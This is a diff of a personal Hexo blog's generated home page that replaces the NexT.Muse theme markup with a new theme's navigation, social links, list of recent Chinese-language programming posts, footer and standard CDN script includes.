-          <a href="https://www.zhihu.com/people/ssgang-ba-zi" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;ssgang-ba-zi" rel="noopener" target="_blank">Zhihu</a>
-        </li>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   --><!--
+     --><li><a href="/archives/">Writing</a></li><!--
+   --><!--
+     --><li><a target="_blank" rel="noopener" href="https://github.com/xudong7?tab=repositories">Projects</a></li><!--
+   -->
     </ul>
   </div>
+</header>
 
-      </div>
+        
+        <section id="about" class="p-note">
+  
+  
+    <p>
+      Find me on
+      
+      
+      
+        
+        
+          <a class="icon u-url" target="_blank" rel="noopener me" href="https://github.com/xudong7" aria-label="github" title="github">
+            <i class="fa-brands fa-github"></i><!--
+      ---></a><!--
+    ---><!--
+    --->, 
+        
+      
+        
+        
+          <a class="icon u-url" target="_blank" rel="noopener me" href="/" aria-label="twitter" title="twitter">
+            <i class="fa-brands fa-twitter"></i><!--
+      ---></a><!--
+    ---><!--
+    --->, 
+        
+      
+        
+        
+          <a class="icon u-url" target="_blank" rel="noopener me" href="/" aria-label="facebook" title="facebook">
+            <i class="fa-brands fa-facebook"></i><!--
+      ---></a><!--
+    ---><!--
+    --->, 
+        
+      
+        
+        
+          <a class="icon u-email" target="_blank" rel="noopener" href="mailto:name@email.com" aria-label="mail" title="mail">
+            <i class="fa-solid fa-envelope"></i><!--
+      ---></a>
+        <!--
+    --->, 
+        
+      
+        
+        
+          <a class="icon u-url" target="_blank" rel="noopener me" href="https://mastodon.social/@alice" aria-label="mastodon.social" title="mastodon.social">
+            <i class="fa-brands fa-mastodon"></i><!--
+      ---></a><!--
+    ---><!--
+    ---> and 
+        
+      
+        
+        
+          <a class="icon u-url" target="_blank" rel="noopener me" href="https://fosstodon.org/@alice" aria-label="fosstodon.org" title="fosstodon.org">
+            <i class="fa-brands fa-mastodon"></i><!--
+      ---></a><!--
+    ---><!--
+    --->.
+        
+      
+    </p>
+  
+</section>
+
+<section id="writing">
+  <span class="h1"><a href="/archives/">Writing</a></span>
+  
+  <ul class="post-list">
+    
+    
+      
+    
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2025-03-21T02:52:32.000Z" class="dt-published" itemprop="datePublished">2025-03-21</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2025/03/21/rust-Vec%E5%AD%98%E5%82%A8%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/">rust-Vec存储不同数据类型的几种方法</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2025-03-19T01:02:22.000Z" class="dt-published" itemprop="datePublished">2025-03-19</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2025/03/19/aop/">aop</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2025-03-18T09:18:52.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2025/03/18/%E4%BA%8B%E5%8A%A1-transactional%E6%B3%A8%E8%A7%A3/">事务-@transactional注解</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2025-03-18T06:47:58.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2025/03/18/%E4%B8%80%E4%BA%BA%E4%B8%80%E5%8D%95%E9%97%AE%E9%A2%98/">一人一单问题</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2025-03-18T04:38:46.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2025/03/18/%E8%B6%85%E5%8D%96%E9%97%AE%E9%A2%98/">超卖问题</a>
+    
+
+
+</span>
+      </li>
+    
+  </ul>
+  
+</section>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Dunjia
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/xudong7?tab=repositories">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
+    <!-- styles -->
 
 
-      </div>
-    </main>
 
-    <footer class="footer">
-      <div class="footer-inner">
-        
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
 
-        
 
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Dunjia</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
-  </div>
+    <!-- jquery -->
 
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="Total Visitors">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="Total Views">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
 
 
 
 
+<!-- clipboard -->
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
-      </div>
-    </footer>
-  </div>
+<!-- Baidu Analytics -->
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<!-- Cloudflare Analytics -->
 
-<script src="/js/utils.js"></script>
+<!-- Disqus Comments -->
 
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
+<!-- utterances Comments -->
 
 </body>
 </html>
